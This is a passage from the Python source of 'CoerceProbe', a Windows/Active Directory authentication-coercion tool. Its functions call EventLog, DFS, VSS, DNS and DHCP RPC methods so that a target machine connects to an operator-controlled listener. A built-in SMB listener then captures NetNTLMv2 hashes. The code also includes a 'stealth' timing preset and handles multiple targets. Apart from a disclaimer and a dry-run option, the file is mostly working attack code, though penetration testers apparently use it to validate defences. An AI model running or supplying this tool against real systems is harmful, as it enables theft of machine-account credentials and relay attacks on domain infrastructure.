            dce.request(request)
            return self._make_result(spec, "CALL_OK", "RPC call returned success; verify listener", started)
        except Exception as exc:
            return self._result_from_exception(spec, exc, started)
        finally:
            self._disconnect(dce)

    def _run_dfs_remove(self, spec: MethodSpec) -> Result:
        started = time.monotonic()
        dce = None
        try:
            dce = self._bind(spec.pipe, spec.uuid, spec.version)
            request = _NetrDfsRemoveStdRoot()
            request["ServerName"] = self._unc_path("share")
            request["RootShare"] = "probe_" + self._token() + "\x00"
            request["ApiFlags"] = 0
            dce.request(request)
            return self._make_result(spec, "CALL_OK", "RPC call returned success; verify listener", started)
        except Exception as exc:
            return self._result_from_exception(spec, exc, started)
        finally:
            self._disconnect(dce)

    def _run_shadow_supported(self, spec: MethodSpec) -> Result:
        started = time.monotonic()
        dce = None
        try:
            dce = self._bind(spec.pipe, spec.uuid, spec.version)
            request = _IsPathSupported()
            request["ShareName"] = self._unc_path("share")
            dce.request(request)
            return self._make_result(spec, "CALL_OK", "RPC call returned success; verify listener", started)
        except Exception as exc:
            return self._result_from_exception(spec, exc, started)
        finally:
            self._disconnect(dce)

    def _run_shadow_copied(self, spec: MethodSpec) -> Result:
        started = time.monotonic()
        dce = None
        try:
            dce = self._bind(spec.pipe, spec.uuid, spec.version)
            request = _IsPathShadowCopied()
            request["ShareName"] = self._unc_path("share")
            dce.request(request)
            return self._make_result(spec, "CALL_OK", "RPC call returned success; verify listener", started)
        except Exception as exc:
            return self._result_from_exception(spec, exc, started)
        finally:
            self._disconnect(dce)

    def _run_even(self, spec: MethodSpec) -> Result:
        started = time.monotonic()
        dce = None
        try:
            dce = self._bind(spec.pipe, spec.uuid, spec.version)
            request = even.ElfrOpenBELW()
            request["UNCServerName"] = NULL
            request["BackupFileName"] = self._unc_path("even")
            request["MajorVersion"] = random.randint(0, 100)
            request["MinorVersion"] = random.randint(0, 100)
            dce.request(request)
            return self._make_result(
                spec,
                "CALL_OK",
                "RPC call returned success; EventLog may have used a null/service context — verify listener",
                started,
            )
        except Exception as exc:
            return self._result_from_exception(spec, exc, started)
        finally:
            self._disconnect(dce)

    def _run_dns_logpath(self, spec: MethodSpec) -> Result:
        started = time.monotonic()
        dce = None
        try:
            dce = self._bind(spec.pipe, spec.uuid, spec.version)
            request = _R_DnssrvOperation()
            request["pwszServerName"] = self.target + "\x00"
            request["pszZone"] = NULL
            request["dwContext"] = 0
            request["pszOperation"] = "LogFilePath\x00"
            request["dwTypeId"] = 3  # DNSSRV_TYPEID_LPWSTR
            union = _DNSSRV_RPC_UNION()
            union["tag"] = 3
            union["WideString"] = self._unc_path("file")
            request["pData"] = union
            dce.request(request)
            return self._make_result(
                spec,
                "CALL_OK",
                "RPC call returned success; DNS should have contacted the listener",
                started,
            )
        except Exception as exc:
            return self._result_from_exception(spec, exc, started)
        finally:
            self._disconnect(dce)

    def _run_dhcp_backup(self, spec: MethodSpec) -> Result:
        started = time.monotonic()
        dce = None
        try:
            dce = self._bind(spec.pipe, spec.uuid, spec.version)
            request = _R_DhcpBackupDatabase()
            request["ServerIpAddress"] = 0
            request["Path"] = self._unc_path("share")
            dce.request(request)
            return self._make_result(
                spec,
                "CALL_OK",
                "RPC call returned success; DHCP should have contacted the listener",
                started,
            )
        except Exception as exc:
            return self._result_from_exception(spec, exc, started)
        finally:
            self._disconnect(dce)

    def _run_dhcp_restore(self, spec: MethodSpec) -> Result:
        started = time.monotonic()
        dce = None
        try:
            dce = self._bind(spec.pipe, spec.uuid, spec.version)
            request = _R_DhcpRestoreDatabase()
            request["ServerIpAddress"] = 0
            request["Path"] = self._unc_path("share")
            dce.request(request)
            return self._make_result(
                spec,
                "CALL_OK",
                "RPC call returned success; DHCP should have contacted the listener",
                started,
            )
        except Exception as exc:
            return self._result_from_exception(spec, exc, started)
        finally:
            self._disconnect(dce)

    # ------------------------- orchestration -------------------------

    def run_method(self, name: str) -> Result:
        spec = METHODS[name]
        self._current_transport = spec.transport
        if self.dry_run:
            if name == "even":
                path_kind = "even"
            elif name == "printer":
                path_kind = "printer"
            elif name.startswith("efsr"):
                path_kind = "file"
            else:
                path_kind = "share"
            return Result(
                method=spec.name,
                protocol=spec.protocol,
                target=self.target,
                listener=self.listener,
                status="DRY_RUN",
                detail=f"would call {spec.description} with path {self._unc_path(path_kind)!r}",
                timestamp=datetime.now(timezone.utc).isoformat(),
            )
        runner = getattr(self, spec.runner)
        return runner(spec)

    def run(self, method_names: list[str], check_listener: bool = True) -> list[Result]:
        if check_listener:
            self._check_listener()
        results: list[Result] = []
        for index, name in enumerate(method_names):
            if index > 0:
                sleep_for = self.delay + (random.uniform(0, self.jitter) if self.jitter else 0.0)
                if sleep_for > 0:
                    self._info(f"[.] sleeping {sleep_for:.1f}s before {name}")
                    time.sleep(sleep_for)

            result: Optional[Result] = None
            for attempt in range(self.retries + 1):
                if attempt:
                    sleep_for = self.delay + (random.uniform(0, self.jitter) if self.jitter else 0.0)
                    if sleep_for > 0:
                        time.sleep(sleep_for)
                result = self.run_method(name)
                if result.success_like() or self.retries == 0:
                    break

            assert result is not None
            self._emit(result)
            results.append(result)

            if self.stop_on_success and result.success_like():
                if not self.quiet and not self.json_output:
                    print("[*] stop-on-success: stopping after a success-like result")
                break

        return results


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def parse_methods(raw: str) -> list[str]:
    if raw.strip().lower() == "all":
        return list(ALL_METHOD_ORDER)
    selected: list[str] = []
    for item in raw.split(","):
        name = item.strip().lower()
        if not name:
            continue
        name = ALIASES.get(name, name)
        if name not in METHODS:
            raise ValueError(f"unknown method: {item!r}")
        if name not in selected:
            selected.append(name)
    return selected


def _parse_target_text(text: str) -> Optional[Target]:
    text = text.strip()
    if not text or text.startswith("#"):
        return None
    if "," in text:
        host, ip = text.split(",", 1)
    else:
        parts = text.split()
        if len(parts) == 2:
            host, ip = parts
        else:
            host, ip = text, None
    host = host.strip()
    ip = (ip or "").strip() or None
    if not host:
        return None
    return Target(host=host, ip=ip)


def load_targets(args: argparse.Namespace) -> list[Target]:
    targets: list[Target] = []
    for raw in args.target:
        target = _parse_target_text(raw)
        if target:
            targets.append(target)

    if args.targets:
        for raw in args.targets.split(","):
            target = _parse_target_text(raw)
            if target:
                targets.append(target)

    if args.targets_file:
        try:
            with open(args.targets_file, "r", encoding="utf-8") as fh:
                for line in fh:
                    target = _parse_target_text(line)
                    if target:
                        targets.append(target)
        except OSError as exc:
            raise ValueError(f"cannot read --targets-file: {exc}") from exc

    # Deduplicate by host while preserving order.
    seen: set[str] = set()
    unique: list[Target] = []
    for target in targets:
        key = target.host.lower()
        if key not in seen:
            seen.add(key)
            unique.append(target)

    if args.target_ip:
        if len(unique) > 1:
            raise ValueError("--target-ip can only be used with a single target; use host,ip in --targets-file")
        if len(unique) == 1:
            unique[0] = Target(host=unique[0].host, ip=args.target_ip)
    return unique


def detect_local_ip(peer: str) -> str:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.connect((peer, 445))
        return sock.getsockname()[0]
    except OSError:
        try:
            return socket.gethostbyname(socket.gethostname())
        except OSError:
            return "127.0.0.1"
    finally:
        sock.close()


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=(
            f"{DISCLAIMER}\n\n"
            "CoerceProbe — authentication-coercion validation for Windows/AD.\n"
            "Triggers documented RPC primitives against one or more targets."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            f"{DISCLAIMER}\n\n"
            "Examples:\n"
            "  python3 coerceprobe.py --list-methods\n"
            "  python3 coerceprobe.py --target dc01 --listener 10.0.0.50 "
            "--username alice --domain CORP --method printer --stealth\n"
            "  python3 coerceprobe.py --targets-file targets.txt --listen "
            "--username alice --domain CORP --method printer\n"
            "  python3 coerceprobe.py --listen-only --listen-port 445\n"
        ),
    )
    parser.add_argument(
        "--version",
        action="version",
        version=f"CoerceProbe {__version__} (author: {__author__})",
    )
    parser.add_argument("--target", action="append", default=[], help="target hostname/IP; repeatable")
    parser.add_argument("--targets", help="comma-separated target hostnames/IPs")
    parser.add_argument("--targets-file", help="file with one target per line: host or host,ip")
    parser.add_argument("--target-ip", help="IP for a single --target")
    parser.add_argument("--listener", help="listener host/IP you control (auto-detected with --listen)")
    parser.add_argument("--listener-port", type=int, default=None, help="listener SMB port (default 445)")
    parser.add_argument("--webdav", action="store_true", help="use WebDAV/HTTP-style listener paths")
    parser.add_argument("--webdav-port", type=int, default=80, help="WebDAV listener port (default 80)")

    lis = parser.add_argument_group("built-in listener")
    lis.add_argument("--listen", action="store_true", help="start the built-in SMB capture listener")
    lis.add_argument("--listen-only", action="store_true", help="start the listener and wait; no coercion")
    lis.add_argument("--listen-address", default="0.0.0.0", help="bind address for --listen (default 0.0.0.0)")
    lis.add_argument("--listen-port", type=int, default=445, help="bind port for --listen (default 445)")
    lis.add_argument("--listen-wait", type=float, default=10.0, help="seconds to keep listening after coercion (default 10)")
    lis.add_argument("--capture-log", help="append captured NetNTLMv2 lines to this file")

    auth = parser.add_argument_group("authentication")
    auth.add_argument("--username", help="domain username")
    auth.add_argument("--password", help="password (omit to prompt)")
    auth.add_argument("--domain", help="NetBIOS or DNS domain")
    auth.add_argument("--hashes", help="LMHASH:NTHASH")
    auth.add_argument("--kerberos", action="store_true", help="use Kerberos instead of NTLM")
    auth.add_argument("--dc-ip", help="KDC/DC IP for Kerberos")
    auth.add_argument("--anonymous", action="store_true", help="use empty credentials (rarely useful)")

    sel = parser.add_argument_group("method selection")
    sel.add_argument("--method", default="printer", help="method, comma-separated list, or 'all'")
    sel.add_argument("--list-methods", action="store_true", help="list methods and exit")

    tr = parser.add_argument_group("transport")
    tr.add_argument(
        "--transport",
        choices=["auto", "smb", "tcp"],
        default="auto",
        help="RPC transport: auto (method default), smb, or tcp (default auto)",
    )
    tr.add_argument("--rpc-port", type=int, help="explicit RPC/TCP endpoint port; overrides endpoint-mapper discovery")
    tr.add_argument("--no-epm", action="store_true", help="disable endpoint-mapper discovery; requires --rpc-port for TCP methods")
    tr.add_argument("--auth-level", choices=sorted(AUTH_LEVELS), default="privacy", help="RPC auth level")
    tr.add_argument("--timeout", type=float, default=8.0, help="connect/IO timeout seconds (default 8)")

    stealth = parser.add_argument_group("noise / timing")
    stealth.add_argument("--stealth", action="store_true", help="low-and-slow preset: 4s delay, 3s jitter, no retries, stop on first success")
    stealth.add_argument("--delay", type=float, default=0.0, help="fixed delay between methods (seconds)")
    stealth.add_argument("--jitter", type=float, default=0.0, help="random extra delay, 0..N seconds")
    stealth.add_argument("--retries", type=int, default=0, help="retries per method (default 0)")
    stealth.add_argument("--stop-on-success", action="store_true", help="stop after first success-like result")
    stealth.add_argument("--randomize-unc", action="store_true", help="randomize UNC path component")
    stealth.add_argument("--no-listener-check", action="store_true", help="skip listener TCP preflight")

    out = parser.add_argument_group("output")
    out.add_argument("--json", action="store_true", help="JSON-lines output")
    out.add_argument("--quiet", action="store_true", help="suppress banner/status messages")
    out.add_argument("--no-color", action="store_true", help="disable ANSI colors")
    out.add_argument("--no-banner", action="store_true", help="suppress banner")
    out.add_argument("--log", help="append JSON-lines results to this file")
    out.add_argument("--engagement", help="engagement name for the local log")
    out.add_argument("--debug", action="store_true", help="show extra diagnostics")

    safe = parser.add_argument_group("safety")
    safe.add_argument("--dry-run", action="store_true", help="print intended calls without sending traffic")
    return parser


def main(argv: Optional[list[str]] = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)

    # The disclaimer is shown for --list-methods, normal runs, and listener-only
    # mode. --help already carries it in the description/epilog.
    print(f"[!] {DISCLAIMER}", file=sys.stderr)

    if args.list_methods:
        for name in ALL_METHOD_ORDER:
            spec = METHODS[name]
            print(f"{name:<18} {spec.protocol:<9} {spec.description}")
        return 0

    try:
        methods = parse_methods(args.method)
    except ValueError as exc:
        parser.error(str(exc))
    if not methods:
        parser.error("no methods selected")

    try:
        targets = load_targets(args)
    except ValueError as exc:
        parser.error(str(exc))

    if args.listen_only:
        args.listen = True
    if args.listen_only and args.dry_run:
        parser.error("--listen-only cannot be combined with --dry-run")
    if args.listen and args.dry_run:
        print("[!] --listen is not started with --dry-run (no network traffic).", file=sys.stderr)
        if not args.listener:
            args.listener = detect_local_ip(targets[0].host if targets else "8.8.8.8")
        args.listen = False
    if args.listen and args.webdav:
        parser.error("--listen is an SMB listener; use an external WebDAV listener with --webdav")
    if not targets and not args.listen_only:
        parser.error("provide --target/--targets/--targets-file, or use --listen-only")
    if args.stealth and args.method.strip().lower() == "all":
        print("[!] --stealth with --method all still tries many protocols; prefer one method.", file=sys.stderr)
    if any(name in methods for name in ("dns-logpath", "dhcp-restore")):
        print(
            "[!] dns-logpath changes the DNS debug log path; dhcp-restore can alter "
            "DHCP configuration. Record the original state and restore it after testing.",
            file=sys.stderr,
        )

    if args.listener_port is None:
        args.listener_port = args.listen_port if args.listen else 445
    if args.listen:
        args.listener_port = args.listen_port
        if args.listen_port != 445 and not args.quiet:
            print(
                "[!] non-445 --listen-port is useful for local testing only; "
                "Windows SMB callbacks normally target TCP/445.",
                file=sys.stderr,
            )

    if args.anonymous:
        args.username = ""
        args.password = ""
        args.hashes = None
    elif (
        not args.listen_only
        and not args.password
        and not args.hashes
        and not args.kerberos
        and not args.dry_run
    ):
        args.password = getpass.getpass(
            f"Password for {args.domain + chr(92) if args.domain else ''}{args.username}: "
        )

    listener: Optional[SMBListener] = None
    if args.listen:
        try:
            listener = SMBListener(
                address=args.listen_address,
                port=args.listen_port,
                json_output=args.json,
                capture_log=args.capture_log,
            )
            listener.start()
        except OSError as exc:
            print(
                f"[!] could not start built-in listener on "
                f"{args.listen_address}:{args.listen_port}: {exc}\n"
                "    Port 445 usually requires root; stop Responder/other SMB services first.",
                file=sys.stderr,
            )
            return 2
        if not args.listener:
            peer = targets[0].host if targets else "8.8.8.8"
            args.listener = detect_local_ip(peer)
        if not args.quiet and not args.no_banner and not args.json:
            print(f"[+] built-in SMB listener on {args.listen_address}:{args.listen_port}")
            print(f"[+] callback address: {args.listener}")
            print("[+] waiting for machine-account authentication...")
    else:
        if not args.listener:
            parser.error("--listener is required unless you use --listen/--listen-only")

    if args.listen_only:
        print("[*] listener-only mode; press Ctrl-C to stop", file=sys.stderr)
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[!] stopping listener", file=sys.stderr)
        finally:
            if listener:
                listener.stop()
        return 0

    if not args.quiet and not args.no_banner and not args.json:
        print(f"CoerceProbe {__version__} — by {__author__}")
        print(f"[*] targets={len(targets)} listener={args.listener} methods={','.join(methods)}")
        if args.dry_run:
            print("[*] DRY RUN — no network traffic will be sent")

    all_results: list[Result] = []
    try:
        for index, target in enumerate(targets, start=1):
            target_args = copy.copy(args)
            target_args.target = target.host
            target_args.target_ip = target.ip or args.target_ip

            if len(targets) > 1 and not args.quiet and not args.json:
                print(f"\n[*] Target {index}/{len(targets)}: {target.host}")

            probe = CoerceProbe(target_args)
            results = probe.run(methods, check_listener=(index == 1))
            all_results.extend(results)
    except KeyboardInterrupt:
        print("\n[!] interrupted", file=sys.stderr)
        if listener:
            listener.stop()
        return 130
    except SystemExit:
        if listener:
            listener.stop()
        raise
    except Exception as exc:
        if listener:
            listener.stop()
        if args.debug:
            raise
        print(f"[!] fatal: {exc}", file=sys.stderr)
        return 1

    if listener:
        if not args.quiet:
            print(
                f"[*] keeping listener open for {args.listen_wait:g}s to catch late callbacks",
                file=sys.stderr,
            )
        listener.wait(args.listen_wait)
        listener.stop()
        if listener.captures and not args.json and not args.quiet:
            print(f"[*] captured {len(listener.captures)} SMB authentication(s)")

    if not args.json and not args.quiet:
        success = sum(1 for r in all_results if r.success_like())
        print(
            f"[*] done: {len(all_results)} method result(s) across "
            f"{len(targets)} target(s), {success} success-like"
        )
        if success:
            print("[*] Verify the actual authentication on the listener; an RPC result alone is not proof.")

    return 0 if any(r.success_like() for r in all_results) else 1


if __name__ == "__main__":
    raise SystemExit(main())
